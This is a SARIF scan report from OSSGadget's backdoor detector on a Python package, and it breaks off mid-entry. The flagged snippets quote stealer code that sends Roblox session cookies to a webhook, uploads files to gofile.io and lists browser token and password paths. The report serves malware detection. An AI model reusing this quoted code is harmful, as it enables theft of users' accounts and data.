{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 209,
                  "startColumn": 3,
                  "endLine": 209,
                  "endColumn": 7,
                  "snippet": {
                    "text": "            pass\n\ndef globalInfo():\n    ip = getip()\n    username = os.getenv(\"USERNAME\")\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    # print(ipdatanojson)\n",
                    "rendered": {
                      "text": "            pass\n\ndef globalInfo():\n    ip = getip()\n    username = os.getenv(\"USERNAME\")\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    # print(ipdatanojson)\n",
                      "markdown": "`            pass\n\ndef globalInfo():\n    ip = getip()\n    username = os.getenv(\"USERNAME\")\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    # print(ipdatanojson)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 42,
                  "endLine": 135,
                  "endColumn": 47,
                  "snippet": {
                    "text": "for modl in requirements:\n    try: __import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)\n        time.sleep(3)\n\nimport requests\n",
                    "rendered": {
                      "text": "for modl in requirements:\n    try: __import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)\n        time.sleep(3)\n\nimport requests\n",
                      "markdown": "`for modl in requirements:\n    try: __import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)\n        time.sleep(3)\n\nimport requests\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 10,
                  "endLine": 127,
                  "snippet": {
                    "text": "        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\nrequirements = [\n    [\"requests\", \"requests\"],\n    [\"Crypto.Cipher\", \"pycryptodome\"]\n",
                    "rendered": {
                      "text": "        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\nrequirements = [\n    [\"requests\", \"requests\"],\n    [\"Crypto.Cipher\", \"pycryptodome\"]\n",
                      "markdown": "`        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\nrequirements = [\n    [\"requests\", \"requests\"],\n    [\"Crypto.Cipher\", \"pycryptodome\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 7,
                  "endLine": 123,
                  "endColumn": 11,
                  "snippet": {
                    "text": "def getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n",
                    "rendered": {
                      "text": "def getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n",
                      "markdown": "`def getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 3,
                  "endLine": 121,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\n\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n",
                    "rendered": {
                      "text": "\n\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n",
                      "markdown": "`\n\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 267,
                  "endLine": 113,
                  "endColumn": 272,
                  "snippet": {
                    "text": "\n\n\na=requests.post(hook, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)\n\n\n",
                    "rendered": {
                      "text": "\n\n\na=requests.post(hook, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)\n\n\n",
                      "markdown": "`\n\n\na=requests.post(hook, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 6,
                  "endLine": 13,
                  "snippet": {
                    "text": "from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \nfrom json import loads, dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\n",
                    "rendered": {
                      "text": "from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \nfrom json import loads, dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\n",
                      "markdown": "`from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \nfrom json import loads, dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 4,
                  "endLine": 7,
                  "endColumn": 12,
                  "snippet": {
                    "text": "from sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \n",
                    "rendered": {
                      "text": "from sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \n",
                      "markdown": "`from sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 4,
                  "endLine": 5,
                  "endColumn": 13,
                  "snippet": {
                    "text": "import os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\n",
                    "rendered": {
                      "text": "import os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\n",
                      "markdown": "`import os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 5,
                  "endLine": 7,
                  "endColumn": 11,
                  "snippet": {
                    "text": "from sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \n",
                    "rendered": {
                      "text": "from sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \n",
                      "markdown": "`from sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nwebhookk='hi' \n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 875,
                  "startColumn": 27,
                  "endLine": 875,
                  "endColumn": 33,
                  "snippet": {
                    "text": "# def uploadToAnonfiles(path):s\n#     try:\n#         files = { \"file\": (path, open(path, mode='rb')) }\n#         upload = requests.post(\"https://transfer.sh/\", files=files)\n#         url = upload.text\n#         return url\n#     except:\n",
                    "rendered": {
                      "text": "# def uploadToAnonfiles(path):s\n#     try:\n#         files = { \"file\": (path, open(path, mode='rb')) }\n#         upload = requests.post(\"https://transfer.sh/\", files=files)\n#         url = upload.text\n#         return url\n#     except:\n",
                      "markdown": "`# def uploadToAnonfiles(path):s\n#     try:\n#         files = { \"file\": (path, open(path, mode='rb')) }\n#         upload = requests.post(\"https://transfer.sh/\", files=files)\n#         url = upload.text\n#         return url\n#     except:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 869,
                  "startColumn": 48,
                  "endLine": 869,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\n# def uploadToAnonfiles(path):s\n",
                    "rendered": {
                      "text": "        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\n# def uploadToAnonfiles(path):s\n",
                      "markdown": "`        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\n# def uploadToAnonfiles(path):s\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 869,
                  "startColumn": 23,
                  "endLine": 869,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\n# def uploadToAnonfiles(path):s\n",
                    "rendered": {
                      "text": "        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\n# def uploadToAnonfiles(path):s\n",
                      "markdown": "`        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\n# def uploadToAnonfiles(path):s\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 541,
                  "startColumn": 20,
                  "endLine": 541,
                  "endColumn": 26,
                  "snippet": {
                    "text": "#         \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n#     }\n\n#     # r = requests.post(hook, files=files)\n#     LoadRequests(\"POST\", hook, files=files)\n\ndef writeforfile(data, name):\n",
                    "rendered": {
                      "text": "#         \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n#     }\n\n#     # r = requests.post(hook, files=files)\n#     LoadRequests(\"POST\", hook, files=files)\n\ndef writeforfile(data, name):\n",
                      "markdown": "`#         \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n#     }\n\n#     # r = requests.post(hook, files=files)\n#     LoadRequests(\"POST\", hook, files=files)\n\ndef writeforfile(data, name):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 32,
                  "endLine": 190,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\n                        return r\n        except:\n",
                    "rendered": {
                      "text": "                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\n                        return r\n        except:\n",
                      "markdown": "`                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\n                        return r\n        except:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 32,
                  "endLine": 186,
                  "endColumn": 38,
                  "snippet": {
                    "text": "        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n",
                    "rendered": {
                      "text": "        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n",
                      "markdown": "`        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 10,
                  "endLine": 113,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n\n\na=requests.post(hook, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)\n\n\n",
                    "rendered": {
                      "text": "\n\n\na=requests.post(hook, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)\n\n\n",
                      "markdown": "`\n\n\na=requests.post(hook, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 97,
                  "startColumn": 16,
                  "endLine": 97,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\n",
                    "rendered": {
                      "text": "    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\n",
                      "markdown": "`    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 12,
                  "endLine": 93,
                  "endColumn": 18,
                  "snippet": {
                    "text": "if isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=hook,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\n",
                    "rendered": {
                      "text": "if isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=hook,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\n",
                      "markdown": "`if isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=hook,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/xolortpdcanegu-0.0.0.tar.gz/xolortpdcanegu-0.0.0.tar/xolortpdcanegu-0.0.0/xolortpdcanegu/__init__.py"
                },
                "region": {
                  "startLine": 796,
                  "startColumn": 117,
                  "endLine": 796,
                  "endColumn": 125,
                  "snippet": {
                    "text": "k])\n    elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n        GamingZip.append([name, lnik])\n    else:\n        OtherZip.append([name, lnik])\n\n\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths = [\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension",
                    "rendered": {
